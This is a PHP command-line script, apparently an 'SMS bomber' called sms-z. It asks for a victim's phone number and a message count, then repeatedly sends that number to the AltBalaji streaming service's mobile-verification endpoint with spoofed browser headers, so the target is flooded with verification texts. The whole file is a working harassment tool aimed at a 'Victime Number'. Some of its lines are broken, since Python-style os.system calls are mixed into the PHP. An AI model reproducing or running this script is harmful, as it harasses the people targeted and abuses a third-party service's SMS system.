<?php
os.system('clear');
/*echo "Are you sure you want to do this?  Type 'yes' to continue: ";
$handle = fopen ("php://stdin","r");
$line = fgets($handle);
if($line != 'yes'){
    echo "ABORTING!\n";
    exit;
}
echo "\n";
echo "Thank you, continuing...\n";
*/
echo " \e[31m  
	███████╗ █████╗ ██╗  ██╗██╗      ██████╗  ██████╗    ███████╗███████╗
	╚══███╔╝██╔══██╗██║ ██╔╝██║      ██╔══██╗██╔════╝    ╚════██║██╔════╝
	  ███╔╝ ███████║█████╔╝ ██║█████╗██████╔╝██║  ███╗█████╗ ██╔╝███████╗
	 ███╔╝  ██╔══██║██╔═██╗ ██║╚════╝██╔══██╗██║   ██║╚════╝██╔╝ ╚════██║
	███████╗██║  ██║██║  ██╗██║      ██║  ██║╚██████╔╝      ██║  ███████║
	╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝      ╚═╝  ╚═╝ ╚═════╝       ╚═╝  ╚══════╝                                      
	\e[0m
\e[96m Enter The Country Code: \e[0m +";
$handle = fopen ("php://stdin","r");
$code = fgets($handle);
if($code != "\n"){
$c = str_replace('
','',$code); 
echo "\e[96m Your Victime Number:\e[0m +".$c;
$hh = fopen ("php://stdin","r");
$n = fgets($hh);
if($n != "\n" ){
$h[] = "Accept: application/json, text/plain, */*";
$h[] = "Content-Type: application/json;charset=UTF-8";
$h[] = "Origin: https://www.altbalaji.com";
$h[] = "Referer: https://www.altbalaji.com/user-detail?pid=OTA%3D";
$h[] = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36";
$h[] = "content-type: application/json";
$data = array(
"country_code" => $c ,
"phone_number" => $n ,
"platform"     => "web"
);
$data_string = json_encode($data);
echo "\e[96m How Many: \e[0m";
$ff = fopen ("php://stdin","r");
$f = fgets($ff);
$s = 0 ;
$fa = 0 ;
for($i = 1 ; $i <= $f ; $i++){
    sleep(2);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.cloud.altbalaji.com/accounts/mobile/verify?domai');
curl_setopt($ch, CURLOPT_POSTFIELDS,$data_string);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36");
$page = curl_exec($ch);
os.system('clear');
if($page === '{"status":"ok"}'){
$s++ ;
}
else{
$fa++ ;
}
echo "

	███████╗ █████╗ ██╗  ██╗██╗      ██████╗  ██████╗    ███████╗███████╗
	╚══███╔╝██╔══██╗██║ ██╔╝██║      ██╔══██╗██╔════╝    ╚════██║██╔════╝
	  ███╔╝ ███████║█████╔╝ ██║█████╗██████╔╝██║  ███╗█████╗ ██╔╝███████╗
	 ███╔╝  ██╔══██║██╔═██╗ ██║╚════╝██╔══██╗██║   ██║╚════╝██╔╝ ╚════██║
	███████╗██║  ██║██║  ██╗██║      ██║  ██║╚██████╔╝      ██║  ███████║
	╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝      ╚═╝  ╚═╝ ╚═════╝       ╚═╝  ╚══════╝
		                                                             
\e[93m	================================================================== \e[0m
		\e[33m  sms-z in progress, please wait !!   \e[0m            
\e[93m	==================================================================\e[0m
	\e[33m	     Target Number           : +".$c."  ".str_replace("\n","",$n)."
		     Number of Requests Sent :  ".$i."\e[0m
	\e[92m	     Successful Requests     :  ".$s." \e[0m
	\e[91m	     Failed Requests         :  ".$fa."\e[0m
\e[93m	==================================================================\e[0m
	\e[33m	      Use this for game, not for hack !!       \e[0m         
	\e[33m	      This sms-z Was Created Zaki-GR-75 !!     \e[0m           
\e[93m	==================================================================\e[0m

";
} 
os.system('clear'); 
}else{
os.system('clear');    
echo "Error!\n";
    exit;
}
}
else{
os.system('clear');
    echo "Error!\n";
exit;
}
?>
